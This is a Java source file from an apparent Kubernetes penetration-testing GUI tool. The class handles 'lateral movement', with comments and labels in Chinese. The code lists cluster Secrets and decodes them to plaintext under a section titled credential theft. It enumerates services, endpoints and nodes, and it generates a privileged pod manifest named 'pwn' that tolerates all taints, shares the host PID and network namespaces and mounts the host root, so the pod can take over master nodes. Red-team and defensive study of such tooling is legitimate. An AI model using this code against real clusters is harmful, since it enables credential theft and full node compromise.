package com.k8spen.tool.controller;

import com.k8spen.tool.view.ResultPane;
import com.k8spen.tool.view.TableRowActions;
import com.google.gson.*;
import com.k8spen.tool.helper.PodJsonParser;
import com.k8spen.tool.helper.SecretTableItem;
import com.k8spen.tool.utils.K8sHttpUtil;
import javafx.collections.FXCollections;
import javafx.concurrent.Task;
import javafx.scene.control.*;

import java.util.ArrayList;
import java.util.List;

/**
 * 横向移动 — 凭证窃取 / 集群内网探测 / 污点横向
 */
public class LateralHandler {

    private final ControllerContext ctx;

    // 凭证窃取
    private final TextField credNs;
    private final ComboBox<String> credTypeFilter;
    private final TableView<SecretTableItem> credSecretTable;
    private final TableColumn<SecretTableItem, String> credColNs, credColName, credColType, credColAge;
    private final TextArea credOutput;

    // 内网探测
    private final ResultPane lateralOutput;

    // 污点横向
    private final TextField lateralTaintNode, lateralTaintImage;
    private final CheckBox lateralTaintHostMount;
    private final ResultPane lateralTaintOutput;

    public LateralHandler(ControllerContext ctx,
                          TextField credNs, ComboBox<String> credTypeFilter,
                          TableView<SecretTableItem> credSecretTable,
                          TableColumn<SecretTableItem, String> credColNs,
                          TableColumn<SecretTableItem, String> credColName,
                          TableColumn<SecretTableItem, String> credColType,
                          TableColumn<SecretTableItem, String> credColAge,
                          TextArea credOutput,
                          ResultPane lateralOutput,
                          TextField lateralTaintNode, TextField lateralTaintImage,
                          CheckBox lateralTaintHostMount, ResultPane lateralTaintOutput) {
        this.ctx = ctx;
        this.credNs = credNs; this.credTypeFilter = credTypeFilter;
        this.credSecretTable = credSecretTable;
        this.credColNs = credColNs; this.credColName = credColName;
        this.credColType = credColType; this.credColAge = credColAge;
        this.credOutput = credOutput;
        this.lateralOutput = lateralOutput;
        this.lateralTaintNode = lateralTaintNode; this.lateralTaintImage = lateralTaintImage;
        this.lateralTaintHostMount = lateralTaintHostMount; this.lateralTaintOutput = lateralTaintOutput;
    }

    public void init() {
        credTypeFilter.getItems().addAll("所有类型",
                "kubernetes.io/service-account-token",
                "kubernetes.io/dockerconfigjson",
                "kubernetes.io/tls",
                "Opaque",
                "kubernetes.io/basic-auth",
                "kubernetes.io/ssh-auth");
        credTypeFilter.setValue("所有类型");

        credColNs.setCellValueFactory(c -> c.getValue().namespaceProperty());
        credColName.setCellValueFactory(c -> c.getValue().nameProperty());
        credColType.setCellValueFactory(c -> c.getValue().typeProperty());
        credColAge.setCellValueFactory(c -> c.getValue().creationTimeProperty());

        credSecretTable.getSelectionModel().selectedItemProperty().addListener((obs, oldVal, newVal) -> {
            if (newVal != null) credNs.setText(newVal.getNamespace());
        });
        credSecretTable.setPlaceholder(new Label("列出 Secret 后，右键或双击记录查看详情"));
        credSecretTable.setColumnResizePolicy(TableView.CONSTRAINED_RESIZE_POLICY);
        TableRowActions.install(credSecretTable, "查看详情（自动解码）", selected -> credViewSecret(),
                selected -> List.of(
                        new TableRowActions.Action<>("复制 Secret 名称", item -> ctx.copyToClipboard(item.getName())),
                        new TableRowActions.Action<>("复制命名空间", item -> ctx.copyToClipboard(item.getNamespace())),
                        new TableRowActions.Action<>("复制类型", item -> ctx.copyToClipboard(item.getType()))));
    }

    // ================ 凭证窃取 ================

    public void credListSecrets() {
        String ns = credNs.getText().trim();
        String typeFilter = credTypeFilter.getValue();
        String path;
        if (ns.isEmpty()) {
            path = "/api/v1/secrets";
            ctx.log("[*] GET 所有namespace的Secrets");
        } else {
            path = "/api/v1/namespaces/" + ns + "/secrets";
            ctx.log("[*] GET " + ns + " 的Secrets");
        }
        if (typeFilter != null && !typeFilter.equals("所有类型")) {
            path += "?fieldSelector=type=" + typeFilter;
        }
        String url = ctx.buildApiServerUrl(path);
        if (url == null) { credOutput.setText("[-] 请填写目标地址"); return; }
        ctx.setStatus("获取Secrets列表...");

        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                return K8sHttpUtil.sendRequest(url, "GET", ctx.getToken(), ctx.getTimeout());
            }
        };
        task.setOnSucceeded(e -> {
            String json = PodJsonParser.stripHttpPrefix(task.getValue());
            List<SecretTableItem> items = parseSecretList(json);
            credSecretTable.setItems(FXCollections.observableArrayList(items));
            credOutput.setText("[+] 列出 " + items.size() + " 个 Secret\n点击表格行后点\"查看详情\"可解码查看");
            ctx.setStatus("Secrets: " + items.size() + "个");
            ctx.log("[+] Secrets列表获取成功: " + items.size() + " 个");
        });
        task.setOnFailed(e -> {
            credOutput.setText("[-] 失败: " + (task.getException() != null ? task.getException().getMessage() : ""));
            ctx.log("[-] Secrets列表获取失败");
        });
        new Thread(task).start();
    }

    public void credViewSecret() {
        SecretTableItem selected = credSecretTable.getSelectionModel().getSelectedItem();
        if (selected == null) { credOutput.setText("[-] 请先选择一个Secret"); return; }
        String ns = selected.getNamespace();
        String name = selected.getName();
        String url = ctx.buildApiServerUrl("/api/v1/namespaces/" + ns + "/secrets/" + name);
        if (url == null) { credOutput.setText("[-] 请填写目标地址"); return; }
        ctx.log("[*] 查看 Secret: " + ns + "/" + name);
        ctx.setStatus("获取Secret详情...");

        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                return K8sHttpUtil.sendRequest(url, "GET", ctx.getToken(), ctx.getTimeout());
            }
        };
        task.setOnSucceeded(e -> {
            String json = PodJsonParser.stripHttpPrefix(task.getValue());
            credOutput.setText(decodeSecretJson(json, ns, name, selected.getType()));
            ctx.setStatus("Secret详情已加载");
            ctx.log("[+] Secret " + ns + "/" + name + " 详情已解码");
        });
        task.setOnFailed(e -> credOutput.setText("[-] 获取失败: " + (task.getException() != null ? task.getException().getMessage() : "")));
        new Thread(task).start();
    }

    public void credCopyOutput() {
        if (credOutput.getText() != null) ctx.copyToClipboard(credOutput.getText());
    }

    // ================ 内网探测 ================

    public void lateralListServices()  { lateralApiGet("/api/v1/services", lateralOutput, "Services"); }
    public void lateralListEndpoints() { lateralApiGet("/api/v1/endpoints", lateralOutput, "Endpoints"); }
    public void lateralListNodes()     { lateralApiGet("/api/v1/nodes", lateralOutput, "Nodes"); }
    public void lateralListNetPol()    { lateralApiGet("/apis/networking.k8s.io/v1/networkpolicies", lateralOutput, "NetworkPolicy"); }
    public void lateralCopyOutput()    { if (lateralOutput.getText() != null) ctx.copyToClipboard(lateralOutput.getText()); }

    // ================ 污点横向 ================

    public void lateralShowTaints() { lateralApiGet("/api/v1/nodes", lateralTaintOutput, "Nodes(污点信息)"); }

    public void lateralGenTaintPod() {
        String node = lateralTaintNode.getText().trim();
        String image = lateralTaintImage.getText().trim();
        if (image.isEmpty()) image = "alpine:3.20";
        boolean hostMount = lateralTaintHostMount.isSelected();

        StringBuilder yaml = new StringBuilder();
        yaml.append("# 污点容忍 Pod - 可调度到Master节点\n# 原理: 通过tolerations容忍所有污点, 可被调度到任意节点\n");
        if (!node.isEmpty()) yaml.append("# 目标节点: ").append(node).append(" (nodeName指定)\n");
        else yaml.append("# 未指定节点, 多次创建有机会调度到Master\n");
        yaml.append("---\napiVersion: v1\nkind: Pod\nmetadata:\n  name: lateral-taint-pod\n  namespace: kube-system\nspec:\n");
        if (!node.isEmpty()) yaml.append("  nodeName: ").append(node).append("\n");
        yaml.append("  tolerations:\n  - operator: Exists\n  hostNetwork: true\n  hostPID: true\n  containers:\n  - name: pwn\n    image: ").append(image).append("\n    command:\n    - sh\n    - -c\n    - 'while true; do sleep 3600; done'\n    securityContext:\n      privileged: true\n");
        if (hostMount) {
            yaml.append("    volumeMounts:\n    - name: host-root\n      mountPath: /host\n  volumes:\n  - name: host-root\n    hostPath:\n      path: /\n");
        }
        lateralTaintOutput.setEditableText(yaml.toString());
        ctx.log("[+] 已生成污点容忍 Pod YAML");
    }

    public void lateralCopyTaintOutput() { if (lateralTaintOutput.getText() != null) ctx.copyToClipboard(lateralTaintOutput.getText()); }

    // ================ 工具方法 ================

    private void lateralApiGet(String path, ResultPane output, String label) {
        String url = ctx.buildApiServerUrl(path);
        if (url == null) { output.setText("[-] 请填写目标地址"); return; }
        ctx.log("[*] GET " + path);
        ctx.setStatus("获取" + label + "...");
        Task<String> task = new Task<>() {
            @Override protected String call() throws Exception {
                return K8sHttpUtil.sendRequest(url, "GET", ctx.getToken(), ctx.getTimeout());
            }
        };
        task.setOnSucceeded(e -> {
            String raw = PodJsonParser.stripHttpPrefix(task.getValue());
            output.showResponse(task.getValue(), formatApiListForDisplay(raw, label));
            ctx.setStatus(label + "已加载");
            ctx.log("[+] " + label + "获取成功");
        });
        task.setOnFailed(e -> output.setText("[-] 失败: " + (task.getException() != null ? task.getException().getMessage() : "")));
        new Thread(task).start();
    }

    private String formatApiListForDisplay(String json, String label) {
        StringBuilder sb = new StringBuilder();
        sb.append("# ").append(label).append("\n").append("=".repeat(60)).append("\n\n");
        try {
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            JsonArray items = root.has("items") ? root.getAsJsonArray("items") : new JsonArray();
            sb.append("[+] 总计: ").append(items.size()).append(" 个\n\n");
            for (int i = 0; i < items.size(); i++) {
                JsonObject item = items.get(i).getAsJsonObject();
                JsonObject meta = item.has("metadata") ? item.getAsJsonObject("metadata") : new JsonObject();
                String ns = meta.has("namespace") ? meta.get("namespace").getAsString() : "-";
                String name = meta.has("name") ? meta.get("name").getAsString() : "";
                sb.append(String.format("[%d] %s/%s\n", i + 1, ns, name));

                if (label.contains("Service") && item.has("spec")) {
                    JsonObject spec = item.getAsJsonObject("spec");
                    String clusterIP = spec.has("clusterIP") ? spec.get("clusterIP").getAsString() : "";
                    String type = spec.has("type") ? spec.get("type").getAsString() : "";
                    sb.append("    Type: ").append(type).append("  ClusterIP: ").append(clusterIP);
                    if (spec.has("ports")) {
                        sb.append("  Ports: ");
                        JsonArray ports = spec.getAsJsonArray("ports");
                        for (int p = 0; p < ports.size(); p++) {
                            JsonObject port = ports.get(p).getAsJsonObject();
                            sb.append(port.has("port") ? port.get("port").getAsInt() : "?");
                            if (port.has("targetPort")) sb.append("->").append(port.get("targetPort"));
                            if (port.has("protocol")) sb.append("/").append(port.get("protocol").getAsString());
                            if (p < ports.size() - 1) sb.append(", ");
                        }
                    }
                    sb.append("\n");
                } else if (label.contains("Endpoint") && item.has("subsets")) {
                    JsonArray subsets = item.getAsJsonArray("subsets");
                    for (int s = 0; s < subsets.size(); s++) {
                        JsonObject subset = subsets.get(s).getAsJsonObject();
                        if (subset.has("addresses")) {
                            JsonArray addrs = subset.getAsJsonArray("addresses");
                            sb.append("    Addresses: ");
                            for (int a = 0; a < addrs.size(); a++) {
                                sb.append(addrs.get(a).getAsJsonObject().get("ip").getAsString());
                                if (a < addrs.size() - 1) sb.append(", ");
                            }
                        }
                        if (subset.has("ports")) {
                            sb.append("  Ports: ");
                            JsonArray ports = subset.getAsJsonArray("ports");
                            for (int p = 0; p < ports.size(); p++) {
                                JsonObject port = ports.get(p).getAsJsonObject();
                                sb.append(port.has("port") ? port.get("port").getAsInt() : "?");
                                if (port.has("protocol")) sb.append("/").append(port.get("protocol").getAsString());
                                if (p < ports.size() - 1) sb.append(", ");
                            }
                        }
                        sb.append("\n");
                    }
                } else if (label.contains("Node")) {
                    if (item.has("status")) {
                        JsonObject status = item.getAsJsonObject("status");
                        if (status.has("addresses")) {
                            JsonArray addrs = status.getAsJsonArray("addresses");
                            sb.append("    ");
                            for (int a = 0; a < addrs.size(); a++) {
                                JsonObject addr = addrs.get(a).getAsJsonObject();
                                sb.append(addr.get("type").getAsString()).append("=").append(addr.get("address").getAsString()).append("  ");
                            }
                            sb.append("\n");
                        }
                    }
                    if (item.has("spec") && item.getAsJsonObject("spec").has("taints")) {
                        JsonArray taints = item.getAsJsonObject("spec").getAsJsonArray("taints");
                        sb.append("    Taints: ");
                        for (int t = 0; t < taints.size(); t++) {
                            JsonObject taint = taints.get(t).getAsJsonObject();
                            sb.append(taint.has("key") ? taint.get("key").getAsString() : "");
                            sb.append("=").append(taint.has("value") ? taint.get("value").getAsString() : "");
                            sb.append(":").append(taint.has("effect") ? taint.get("effect").getAsString() : "");
                            if (t < taints.size() - 1) sb.append(", ");
                        }
                        sb.append("\n");
                    }
                }
                sb.append("\n");
            }
        } catch (Exception e) {
            sb.append("[-] 解析失败: ").append(e.getMessage()).append("\n").append(json.substring(0, Math.min(500, json.length())));
        }
        return sb.toString();
    }

    private List<SecretTableItem> parseSecretList(String json) {
        List<SecretTableItem> result = new ArrayList<>();
        try {
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            JsonArray items = root.has("items") ? root.getAsJsonArray("items") : new JsonArray();
            for (int i = 0; i < items.size(); i++) {
                JsonObject s = items.get(i).getAsJsonObject();
                JsonObject meta = s.getAsJsonObject("metadata");
                String ns = meta.has("namespace") ? meta.get("namespace").getAsString() : "";
                String name = meta.has("name") ? meta.get("name").getAsString() : "";
                String type = s.has("type") ? s.get("type").getAsString() : "";
                String time = meta.has("creationTimestamp") ? meta.get("creationTimestamp").getAsString() : "";
                result.add(new SecretTableItem(ns, name, type, time));
            }
        } catch (Exception ignored) {}
        return result;
    }

    private String decodeSecretJson(String json, String ns, String name, String type) {
        StringBuilder sb = new StringBuilder();
        sb.append("# Secret: ").append(ns).append("/").append(name).append("\n");
        sb.append("# Type: ").append(type).append("\n");
        sb.append("# kubectl get secret ").append(name).append(" -n ").append(ns).append(" -o yaml\n");
        sb.append("=".repeat(60)).append("\n\n");
        try {
            JsonObject root = JsonParser.parseString(json).getAsJsonObject();
            if (root.has("data") && !root.get("data").isJsonNull()) {
                JsonObject data = root.getAsJsonObject("data");
                sb.append("## data (Base64已解码):\n\n");
                for (String key : data.keySet()) {
                    String b64 = data.get(key).getAsString();
                    String decoded;
                    try { decoded = new String(java.util.Base64.getDecoder().decode(b64), "UTF-8"); }
                    catch (Exception e) { decoded = "(Base64解码失败) " + b64; }
                    sb.append("--- ").append(key).append(" ---\n").append(decoded).append("\n\n");
                }
            } else sb.append("(无data字段)\n");
            if (root.has("metadata")) {
                JsonObject meta = root.getAsJsonObject("metadata");
                if (meta.has("annotations") && !meta.get("annotations").isJsonNull()) {
                    sb.append("\n## annotations:\n");
                    JsonObject ann = meta.getAsJsonObject("annotations");
                    for (String key : ann.keySet()) sb.append("  ").append(key).append(": ").append(ann.get(key).getAsString()).append("\n");
                }
            }
        } catch (Exception e) {
            sb.append("[-] JSON解析失败: ").append(e.getMessage()).append("\n").append(json);
        }
        return sb.toString();
    }
}
